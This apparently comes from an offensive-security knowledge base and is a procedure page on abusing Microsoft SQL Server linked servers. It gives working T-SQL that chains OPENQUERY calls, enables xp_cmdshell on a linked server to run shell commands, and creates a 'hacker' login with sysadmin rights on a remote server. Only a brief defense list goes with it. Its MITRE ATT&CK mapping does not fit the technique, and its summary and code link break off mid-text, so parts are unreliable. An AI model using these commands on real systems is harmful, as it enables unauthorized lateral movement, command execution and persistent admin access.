---
id: 9c6deda4-b769-47ae-8fc2-446a887215cd
name: Linked Database Query Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:20.041897+00:00'
updated_at: '2023-04-10T20:36:34.608347+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Custom Cryptographic Protocol|T1024 - Custom Cryptographic Protocol]]'
- '[[Signed Script Proxy Execution|T1216 - Signed Script Proxy Execution]]'
- '[[Windows Management Instrumentation|T1047 - Windows Management Instrumentation]]'
tags:
- '[[Execute Query Through The Link]]'
- '[[Linked Database]]'
- '[[MSSQL Server]]'
commands:
- '[[Create user and give admin privileges]]'
- '[[Execute query through linked server]]'
- '[[Execute shell commands]]'
---

# Linked Database Query Execution

## Summary

This procedure involves executing SQL queries and commands through linked servers in order to gain access to remote databases. This can be used offensively by attackers to move laterally within a network and gain access to sensitive data. In technical terms, a linked server allows a SQL Server inst

## Description

# Description

This procedure involves executing SQL queries and commands through linked servers in order to gain access to remote databases. This can be used offensively by attackers to move laterally within a network and gain access to sensitive data. In technical terms, a linked server allows a SQL Server instance to execute commands against OLE DB data sources on a remote server. The business value of this procedure is that it enables legitimate users to access data from multiple servers in a single query, however, it can also be exploited by attackers to gain unauthorized access to sensitive data.

## Requirements

1. Authenticated access to the SQL Server instance with permissions to execute queries

1. Access to a linked server with appropriate permissions

1. Knowledge of SQL queries and commands

## Defense

1. Limit the use of linked servers to only trusted sources

1. Monitor for suspicious activity related to linked server queries

1. Implement least privilege access controls to limit the permissions of users who can execute linked server queries

## Objectives

1. Gain access to remote databases

1. Move laterally within a network

1. Access sensitive data

# Instructions

1. This command allows the execution of SQL queries and commands through linked servers. The 'OPENQUERY' function is used to execute a query on a linked server. The 'EXECUTE' function is used to execute a command on a linked server. The 'sp_configure' function is used to configure SQL Server settings. The 'sp_addsrvrolemember' function is used to add a login to a server role.

**Code**: [[-- Execute query through the link
SELECT * FROM OP]]

> The 'SELECT' statement is used to retrieve data from a database. In this case, it is used to retrieve data from a linked server. The 'EXECUTE' statement is used to execute a command or stored procedure. In this case, it is used to execute a command on a linked server. The 'sp_configure' function is used to configure SQL Server settings. In this case, it is used to enable the 'xp_cmdshell' option. The 'sp_addsrvrolemember' function is used to add a login to a server role. In this case, it is used to add the 'hacker' login to the 'sysadmin' server role.

**Command** ([[Execute query through linked server]]):

```bash
SELECT * FROM OPENQUERY("dcorp-sql1", 'SELECT * FROM master..sysservers')
SELECT version FROM OPENQUERY("linkedserver", 'SELECT @@version AS version');

-- Chain multiple openquery
SELECT version FROM OPENQUERY("link1",'SELECT version FROM OPENQUERY("link2","SELECT @@version AS version")')
```

**Command** ([[Execute shell commands]]):

```bash
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
SELECT 1 FROM OPENQUERY("linkedserver",'SELECT 1;EXEC master..xp_cmdshell "dir c:"')
```

**Command** ([[Create user and give admin privileges]]):

```bash
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Custom Cryptographic Protocol|T1024 - Custom Cryptographic Protocol]]
- [[Signed Script Proxy Execution|T1216 - Signed Script Proxy Execution]]
- [[Windows Management Instrumentation|T1047 - Windows Management Instrumentation]]

## Commands Used

- [[Create user and give admin privileges]]
- [[Execute query through linked server]]
- [[Execute shell commands]]

## Tags

- [[Execute Query Through The Link]]
- [[Linked Database]]
- [[MSSQL Server]]
